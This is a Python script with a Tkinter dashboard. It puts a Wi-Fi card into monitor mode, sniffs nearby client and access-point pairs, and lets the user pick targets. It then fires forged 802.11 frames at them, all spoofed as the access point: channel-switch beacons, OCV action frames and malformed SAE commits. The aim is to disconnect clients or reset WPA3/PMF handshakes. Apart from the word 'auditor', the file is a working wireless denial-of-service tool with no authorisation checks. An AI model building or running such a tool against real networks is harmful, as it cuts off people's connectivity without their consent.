import os, sys, time, threading
from scapy.all import *
import tkinter as tk
from tkinter import messagebox

class SurgicalLogicDashboard:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {}  # {ClientMAC: {"BSSID": bssid, "CH": ch}}
        self.running = True
        
        # Initialize hardware
        self.setup_monitor()
        
        # --- UI Setup ---
        self.root = tk.Tk()
        self.root.title("Surgical Logic Dashboard v4.0")
        self.root.geometry("950x750")
        self.root.configure(bg="#050505")

        # Header
        header = tk.Label(self.root, text="WPA3/PMF SURGICAL AUDITOR", fg="#00FF41", bg="#050505", font=("Courier", 16, "bold"))
        header.pack(pady=10)

        # Target Listbox
        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", selectmode="multiple", 
                                 font=("Courier", 10), borderwidth=0, highlightthickness=1)
        self.listbox.pack(padx=20, pady=10, fill="both", expand=True)

        # Controls
        btn_frame = tk.Frame(self.root, bg="#050505")
        btn_frame.pack(pady=20)
        
        # Attack Buttons
        tk.Button(btn_frame, text="CSA WHISPER", command=lambda: self.execute("CSA"), 
                  bg="#0044aa", fg="white", width=18, font=("Arial", 10, "bold")).grid(row=0, column=0, padx=10)
        
        tk.Button(btn_frame, text="OCV VIOLATION", command=lambda: self.execute("OCV"), 
                  bg="#aa5500", fg="white", width=18, font=("Arial", 10, "bold")).grid(row=0, column=1, padx=10)
        
        tk.Button(btn_frame, text="SAE RESET", command=lambda: self.execute("SAE"), 
                  bg="#880000", fg="white", width=18, font=("Arial", 10, "bold")).grid(row=0, column=2, padx=10)

        # Repair Button
        tk.Button(self.root, text="REPAIR WIFI & EXIT", command=self.shutdown, 
                  bg="#333", fg="#ff4444", width=30).pack(pady=20)

        self.status_var = tk.StringVar(value="Scanning Airwaves...")
        tk.Label(self.root, textvariable=self.status_var, fg="#888", bg="#050505").pack()

        # Start background threads
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner_logic, daemon=True).start()

    def setup_monitor(self):
        print("[*] Preparing Hardware...")
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def hopper(self):
        ch = 1
        while self.running:
            os.system(f"sudo iw dev {self.iface} set channel {ch}")
            self.current_ch = ch
            ch = (ch % 13) + 1
            time.sleep(0.5)

    def scanner_logic(self):
        def process_packet(pkt):
            if pkt.haslayer(Dot11):
                src = pkt.addr2
                bssid = pkt.addr3
                if src and bssid and src != bssid and src != "ff:ff:ff:ff:ff:ff":
                    if src not in self.discovered:
                        self.discovered[src] = {"BSSID": bssid, "CH": self.current_ch}
                        self.root.after(0, self.update_ui)
        sniff(iface=self.iface, prn=process_packet, store=0)

    def update_ui(self):
        self.listbox.delete(0, tk.END)
        for client, info in self.discovered.items():
            self.listbox.insert(tk.END, f"CLIENT: {client}  -->  AP: {info['BSSID']} [CH {info['CH']}]")

    def execute(self, mode):
        selection = self.listbox.curselection()
        if not selection:
            messagebox.showwarning("Selection Required", "Please select at least one target.")
            return

        for i in selection:
            client_mac = list(self.discovered.keys())[i]
            target_info = self.discovered[client_mac]
            threading.Thread(target=self.fire_packet, args=(client_mac, target_info['BSSID'], target_info['CH'], mode), daemon=True).start()

    def fire_packet(self, target, bssid, channel, mode):
        # Lock channel before firing
        os.system(f"sudo iw dev {self.iface} set channel {channel}")
        
        base = RadioTap()/Dot11(addr1=target, addr2=bssid, addr3=bssid)
        
        if mode == "CSA":
            # Tag 37: Switch to Ghost Channel 13
            pkt = base/Dot11Beacon()/Dot11Elt(ID=37, len=3, info=chr(1)+chr(13)+chr(1))
        elif mode == "OCV":
            # FIXED: Using 'act' instead of 'action' for Scapy/Python 3.13 compatibility
            pkt = base/Dot11Action(category=10, act=4)/Raw(load=b"\xff\x0a\x01\x01")
        elif mode == "SAE":
            # Malformed SAE commit to trigger state machine reset
            pkt = base/Dot11Auth(algo=3, seqnum=1, status=0)
        
        self.status_var.set(f"Executing {mode} on {target}...")
        sendp(pkt, iface=self.iface, count=60, inter=0.02, verbose=False)
        self.status_var.set("Scanning Airwaves...")

    def shutdown(self):
        self.running = False
        print("[*] Repairing Wi-Fi Logic...")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type managed")
        os.system(f"sudo ip link set {self.iface} up")
        os.system("sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 tests.py [interface]")
    else:
        SurgicalLogicDashboard(sys.argv[1]).root.mainloop()
